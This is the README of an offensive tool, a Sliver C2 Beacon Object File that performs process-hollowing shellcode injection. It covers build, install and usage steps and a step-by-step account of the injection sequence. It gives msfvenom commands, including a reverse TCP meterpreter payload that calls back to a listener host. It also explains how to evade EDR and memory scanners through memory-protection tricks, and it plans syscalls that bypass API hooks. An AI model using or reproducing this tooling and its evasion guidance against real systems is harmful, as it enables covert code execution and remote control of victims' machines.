# Process Hollowing BOF for Sliver C2

A Beacon Object File (BOF) that performs suspended-process shellcode injection
via `SetThreadContext` RIP hijacking. Designed for the
[Sliver C2](https://github.com/BishopFox/sliver) framework and runs on top of
the [COFFLoader](https://github.com/sliverarmory/COFFLoader) extension.

The BOF spawns a target executable in `CREATE_SUSPENDED` state, allocates a
fresh memory region in the victim process, writes operator-supplied x64
shellcode into it, redirects the suspended thread's instruction pointer to the
allocated region, and resumes it. The shellcode then runs under the victim
process's identity and token.

## Features

- **Operator-supplied shellcode** -- payload is passed at runtime via
  `--shellcode <path>`, no recompilation needed to swap payloads.
- **Arbitrary payload size** -- uses `VirtualAllocEx` for the injected region,
  so both small (399-byte MessageBox) and large (~200 KB stageless meterpreter)
  shellcode work through the same code path.
- **Memory hygiene** -- the allocated region transitions
  `RW -> RWX -> RX`: allocated as `PAGE_READWRITE`, briefly flipped to
  `PAGE_EXECUTE_READWRITE` so encoded/self-modifying decoders can self-decrypt,
  then dropped to `PAGE_EXECUTE_READ` after the decoder settles.
- **Self-contained** -- no Windows SDK dependency at build time beyond mingw;
  PEB / PE-header parsing is intentionally omitted (the
  entrypoint-overwrite approach this replaces fails for large payloads).

## Requirements

- [Sliver](https://github.com/BishopFox/sliver) client with the
  `coff-loader` extension installed (`armory install coff-loader`).
- `x86_64-w64-mingw32-gcc` (mingw-w64).
  - macOS: `brew install mingw-w64`
  - Debian/Ubuntu: `sudo apt install mingw-w64`
- Shellcode generator (e.g. `msfvenom`) to produce raw x64 payload bytes.

## Build

```bash
cd process_hollowing
make
```

This produces `process_hollowing.x64.o` -- a COFF object file consumable by
Sliver's COFFLoader. Other useful targets: `make clean`, `make rebuild`.

## Install into Sliver

There are two ways to load the BOF into the Sliver client.

### Method 1 -- copy into the extensions directory (auto-load)

Drop the `process_hollowing/` directory into the Sliver client extensions
folder. The BOF is discovered automatically on the next Sliver client start,
no manual `extensions load` needed each session.

```bash
mkdir -p ~/.sliver-client/extensions
cp -r process_hollowing ~/.sliver-client/extensions/
```

### Method 2 -- load manually per session

From a running Sliver client:

```
sliver > extensions load /path/to/BOF-Sliver-ProccessHollowing/process_hollowing
```

This loads the BOF for the current session only; re-run the command after
restarting the Sliver client.

### Dependency

Both methods require the `coff-loader` extension. Install it once via the
armory if it is not already present:

```
sliver > armory install coff-loader
```

## Usage

```
sliver > hollow -- --target "C:\Windows\System32\notepad.exe" --shellcode /tmp/sc.bin
```

Arguments:

| Name       | Type   | Required | Description                                              |
|------------|--------|----------|----------------------------------------------------------|
| `target`   | string | yes      | Path to the victim executable to hollow (on the target). |
| `shellcode`| file   | yes      | Path to raw x64 shellcode bytes (on the operator's host). |

The `--shellcode` path is resolved on the machine running the Sliver client
(operator-side); Sliver reads the file and packs the bytes inline into the BOF
argument buffer. Use an absolute path.

If `--shellcode` is omitted the BOF refuses to run and prints an error to the
Sliver console.

## Shellcode generation examples

Generate raw bytes (`-f raw`, not `-f c`):

```bash
# x64 MessageBoxA -- visual confirmation, safe placeholder
msfvenom -p windows/x64/messagebox EXITFUNC=thread \
  TITLE="BOF" TEXT="process hollowing ok" \
  -b '\x00\x0a\x0d' --smallest \
  -f raw -o /tmp/sc.bin

# x64 calc.exe -- classic PoC
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread \
  -b '\x00' --smallest \
  -f raw -o /tmp/sc.bin

# x64 stageless reverse TCP meterpreter
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=10.10.17.254 LPORT=9191 \
  EXITFUNC=thread -f raw -o /tmp/sc.bin
```

Rules when generating:

1. Payloads must be **x64** -- the BOF is built for amd64 only.
2. Prefer `EXITFUNC=thread` so the shellcode does not terminate the hollowed
   host process on return (`EXITFUNC=process` would kill the victim the moment
   the payload exits, which is noisy and detectable).
3. Encoded payloads (e.g. msfvenom `x64/xor`, `-b '\x00'`) are fine -- the
   brief `RWX` window after `WriteProcessMemory` allows the decoder stub to
   self-modify before the page is flipped to `RX`.

## How it works

`go()` performs the following steps:

1. `BeaconDataParse` -- extract `target` (string) and `shellcode` (raw bytes).
2. `CreateProcessA(target, CREATE_SUSPENDED)` -- spawn the victim suspended.
3. `VirtualAllocEx` -- allocate a fresh `PAGE_READWRITE` region of size
   `sc_size` in the victim. Allocating as `RW` (not `RWX`) avoids the
   `RWX-at-alloc-time` heuristic that EDRs flag.
4. `WriteProcessMemory` -- write the shellcode bytes into the new region.
5. `VirtualProtectEx -> PAGE_EXECUTE_READWRITE` -- flip the region to `RWX`
   so encoded/self-modifying decoders can write to their own body before
   dispatching. The original protection is recorded.
6. `GetThreadContext` (`CONTEXT_CONTROL`) -- read the suspended thread's
   current `Rip` (typically `ntdll!RtlUserThreadStart` thunk).
7. `ctx.Rip = allocAddr`, then `SetThreadContext` -- redirect the thread to
   start at the shellcode.
8. `ResumeThread` -- the thread begins executing at `allocAddr`.
9. `WaitForSingleObject(thread, 100 ms)` -- heuristic wait for the decoder to
   settle. Returns `WAIT_TIMEOUT` (0x102) after the wait elapses, which is the
   expected result whether the shellcode is a quick MessageBox or a
   long-running reverse shell blocked on `connect()`.
10. `VirtualProtectEx -> PAGE_EXECUTE_READ` -- strip the `W` bit. The region
    becomes plain executable memory; scanners that flag `RWX` regions in
    remote processes will miss this one.
11. `CloseHandle` -- release process and thread handles.

Every step is logged to the Sliver console via `BeaconPrintf`. The COFFLoader
has no debugger; the printf stream is the only execution signal.

### Why not overwrite the victim's entrypoint?

An earlier version of this BOF used `VirtualProtectEx` to flip the victim's
`.text` entrypoint to `RWX` and overwrote it with the shellcode. That approach
breaks for real-sized payloads (~200 KB stageless meterpreter): the protection
change spanning the entrypoint overshoots `.text` and runs out of the mapped
image, so `VirtualProtectEx` returns `FALSE`. Allocating a fresh region with
`VirtualAllocEx` has no such size ceiling, and both small and large payloads
use the same code path.

## Limitations / Future work

- **API hooks**: the BOF calls kernel32 cross-process wrappers directly
  through the BOF import table (`KERNEL32$VirtualAllocEx`,
  `KERNEL32$WriteProcessMemory`, `KERNEL32$VirtualProtectEx`,
  `KERNEL32$GetThreadContext`, `KERNEL32$SetThreadContext`,
  `KERNEL32$ResumeThread`, `KERNEL32$WaitForSingleObject`,
  `KERNEL32$CreateProcessA`, `KERNEL32$CloseHandle`). An EDR with userland
  hooks on these APIs will observe the textbook injection sequence. A planned
  follow-up replaces the cross-process wrappers with indirect syscalls
  (HellsGate / HalosGate) against `ntdll` to bypass userland hooks.
- **Architecture**: x64-only. A 32-bit build is not currently produced.
- **Decoder timing**: the 100 ms heuristic in step 9 assumes the shellcode
  decoder (if any) finishes self-decrypting within that window. Stock
  msfvenom encoders and stageless meterpreter satisfy this; a custom shellcode
  whose decoder runs longer and writes to the code region after the page is
  flipped to `RX` would crash on the subsequent write.
- **Windows-only**: BOFs in Sliver are supported only for Windows implants.

## Repository layout

```
process_hollowing/
├── src/
│   ├── process_hollowing.c   # BOF entrypoint go() + hollowing logic
│   └── beacon.h              # COFFLoader beacon API header (upstream)
├── extension.json            # Sliver manifest (args: target, shellcode)
└── Makefile                  # x86_64-w64-mingw32-gcc build
```

## Acknowledgments

- Original Rust process-hollowing reference by
  [@5mukx](https://git.smukx.site/smukx/Rust-for-Malware-Development).
- [COFFLoader](https://github.com/sliverarmory/COFFLoader) by TrustedSec /
  Sliver Armory -- the beacon API header in `src/beacon.h` is sourced from
  this project.
- [Sliver](https://github.com/BishopFox/sliver) by Bishop Fox.

## License

MIT -- see [LICENSE](LICENSE).